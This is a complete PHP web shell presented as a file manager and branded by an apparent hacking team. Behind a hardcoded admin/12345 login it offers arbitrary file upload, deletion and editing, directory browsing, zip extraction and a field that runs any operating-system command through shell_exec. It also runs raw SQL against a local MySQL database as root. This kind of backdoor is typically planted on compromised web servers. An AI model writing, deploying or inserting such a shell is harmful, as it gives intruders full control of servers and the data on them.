<?php
session_start();

// Konfigurasi Login
$hashed_password = password_hash("12345", PASSWORD_BCRYPT);
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['login'])) {
        if ($_POST['user'] === "admin" && password_verify($_POST['pass'], $hashed_password)) {
            $_SESSION['logged_in'] = true;
        } else {
            echo "<script>alert('Login gagal!');</script>";
        }
    }
    echo '<form method="post"><input name="user" placeholder="Username"><br><input type="password" name="pass" placeholder="Password"><br><button name="login">Login</button></form>';
    exit;
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: filemanager.php");
    exit;
}

// Direktori saat ini
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (!is_dir($dir)) die("Direktori tidak ditemukan!");

function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB'];
    for ($i = 0; $size >= 1024 && $i < 3; $i++) $size /= 1024;
    return round($size, 2) . ' ' . $units[$i];
}

// Upload File
if (isset($_FILES['file'])) move_uploaded_file($_FILES['file']['tmp_name'], $dir . '/' . $_FILES['file']['name']);

// Hapus File
if (isset($_GET['delete'])) unlink($_GET['delete']);

// ZIP & UNZIP
if (isset($_GET['zip'])) {
    $zip = new ZipArchive();
    $zip->open("$dir/backup.zip", ZipArchive::CREATE);
    $zip->addGlob("$dir/*");
    $zip->close();
}
if (isset($_GET['unzip'])) {
    $zip = new ZipArchive();
    $zip->open("$dir/backup.zip");
    $zip->extractTo($dir);
    $zip->close();
}

// Terminal Command
if (isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}

// MySQL Query Executor
if (isset($_POST['sql_query'])) {
    $conn = new mysqli("localhost", "root", "", "test");
    $result = $conn->query($_POST['sql_query']);
    if ($result === TRUE) {
        echo "Query berhasil!";
    } elseif ($result) {
        while ($row = $result->fetch_assoc()) {
            echo "<pre>" . print_r($row, true) . "</pre>";
        }
    } else {
        echo "Error: " . $conn->error;
    }
    $conn->close();
}

// List File
$files = scandir($dir);
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Manager - Z-BL4CX-H4T TEAM</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
    <style>
        body { background-color: black; color: red; font-family: Arial; text-align: center; }
        table { width: 80%; margin: auto; border-collapse: collapse; }
        th, td { padding: 10px; border: 1px solid red; }
        a { color: red; text-decoration: none; }
        a:hover { text-decoration: underline; }
        input, button { background-color: black; color: red; border: 1px solid red; padding: 5px; }
        textarea { width: 90%; height: 300px; background-color: black; color: red; border: 1px solid red; }
    </style>
</head>
<body>

<h2>🔥 File Manager - Z-BL4CX-H4T TEAM 🔥</h2>
<p>Path: <?= htmlspecialchars($dir) ?></p>
<a href="?logout=true">Logout</a>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="file"> <button type="submit">Upload</button>
</form>

<a href="?zip=true&dir=<?= urlencode($dir) ?>">📦 ZIP</a> | 
<a href="?unzip=true&dir=<?= urlencode($dir) ?>">📂 UNZIP</a>

<form method="post">
    <input name="cmd" placeholder="Masukkan perintah...">
    <button type="submit">Jalankan</button>
</form>

<form method="post">
    <textarea name="sql_query" placeholder="Masukkan Query SQL..."></textarea>
    <button type="submit">Eksekusi</button>
</form>

<form method="post">
    <textarea id="editor"><?= isset($_GET['edit']) ? htmlspecialchars(file_get_contents($_GET['edit'])) : '' ?></textarea>
    <input type="hidden" name="save_file" value="<?= isset($_GET['edit']) ? $_GET['edit'] : '' ?>">
    <button type="submit">Simpan</button>
</form>

<table>
    <tr><th>Nama</th><th>Ukuran</th><th>Aksi</th></tr>
    <?php foreach ($files as $file): if ($file == "." || $file == "..") continue; ?>
        <tr>
            <td><a href="?dir=<?= urlencode(realpath("$dir/$file")) ?>"><?= $file ?></a></td>
            <td><?= is_file("$dir/$file") ? formatSize(filesize("$dir/$file")) : '-' ?></td>
            <td>
                <?php if (is_file("$dir/$file")): ?>
                    <a href="?delete=<?= urlencode(realpath("$dir/$file")) ?>" onclick="return confirm('Hapus file ini?')">🗑 Hapus</a>
                    <a href="?edit=<?= urlencode(realpath("$dir/$file")) ?>">✍ Edit</a>
                <?php endif; ?>
            </td>
        </tr>
    <?php endforeach; ?>
</table>

<script>
    let editor = CodeMirror.fromTextArea(document.getElementById('editor'), {
        mode: "application/x-httpd-php",
        lineNumbers: true,
        theme: "monokai"
    });
</script>

</body>
</html>
